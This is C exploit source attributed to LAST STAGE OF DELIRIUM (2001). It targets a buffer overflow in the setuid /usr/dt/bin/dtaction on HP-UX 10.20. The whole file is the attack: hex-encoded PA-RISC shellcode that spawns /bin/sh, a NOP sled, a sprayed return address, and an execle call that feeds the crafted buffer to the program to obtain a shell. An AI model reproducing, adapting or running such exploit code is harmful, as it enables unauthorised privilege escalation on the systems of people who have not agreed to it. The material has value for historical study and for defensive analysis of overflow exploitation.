/*## copyright LAST STAGE OF DELIRIUM may 2001 poland        *://lsd-pl.net/ #*/
/*## /usr/dt/bin/dtaction                                                    #*/

#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>

#define ADRNUM 7000
#define NOPNUM 5000

char shellcode[]=
    "\xeb\x5f\x1f\xfd"    /* bl     .+8,%r26               */
    "\x0b\x39\x02\x99"    /* xor    %r25,%r25,%r25         */
    "\xb7\x5a\x40\x22"    /* addi,< 0x11,%r26,%r26         */
    "\x0f\x40\x12\x0e"    /* stbs   %r0,7(%r26)            */
    "\x20\x20\x08\x01"    /* ldil   L%0xc0000004,%r1       */
    "\xe4\x20\xe0\x08"    /* ble    R%0xc0000004(%sr7,%r1) */
    "\xb4\x16\x70\x16"    /* addi,> 0xb,%r0,%r22           */
    "/bin/sh"
;

char jump[]=
    "\xe0\x40\x00\x00"    /* be     0x0(%sr0,%rp)          */
    "\x37\xdc\x00\x00"    /* copy   %sp,%ret0              */
;

char nop[]="\x0a\xb5\x02\x95";

int main(int argc,char **argv,char **e){
    char buffer[20000],pch[4],adr[4],*b,*b2,*envp[2];  
    int i; 

    printf("copyright LAST STAGE OF DELIRIUM may 2001 poland  //lsd-pl.net/\n");
    printf("/usr/dt/bin/dtaction for HP-UX 10.20 700/800\n");    

    if(argc<2){
         printf("usage: %s display \n",argv[0]);exit(-1);
    }

    *((unsigned long*)adr)=(*(unsigned long(*)())jump)()+5156-128;
    *((unsigned long*)pch)=(*(unsigned long(*)())jump)()-2040;
    
    envp[0]=&buffer[8000];
    envp[1]=0;
    printf("0x%x\n",*((unsigned long*)adr));

    b=buffer;
    for(i=0;i<5000;i++)  *b++=adr[i%4];
    for(i=0;i<2000;i++)  *b++=pch[i%4];
    *b=0;

    b=&buffer[7000];
    strcpy(b,"lsd=");b+=4;
    for(i=0;i<NOPNUM;i++)  *b++=nop[i%4];
    for(i=0;i<strlen(shellcode);i++) *b++=shellcode[i];
    *b=0;

    execle("/usr/dt/bin/dtaction","lsd","-display",argv[1],"-u",buffer,0,envp);
}

